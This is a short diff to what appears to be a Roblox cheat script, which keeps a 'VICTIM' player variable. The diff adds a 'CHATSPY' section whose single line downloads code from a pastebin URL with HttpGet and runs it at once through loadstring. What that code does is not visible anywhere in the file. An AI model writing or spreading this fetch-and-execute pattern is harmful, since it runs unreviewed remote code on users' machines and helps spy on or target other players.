@@ -12,6 +12,9 @@ local RS = game:GetService("RunService")
 local currentPlrs = {}
 local VICTIM = nil
 
+--]]> CHATSPY <[[--
+loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))()
+
 local function getFullUser(input)
     local MATCHES = {}
     local PLAYERS = game.Workspace:GetChildren()
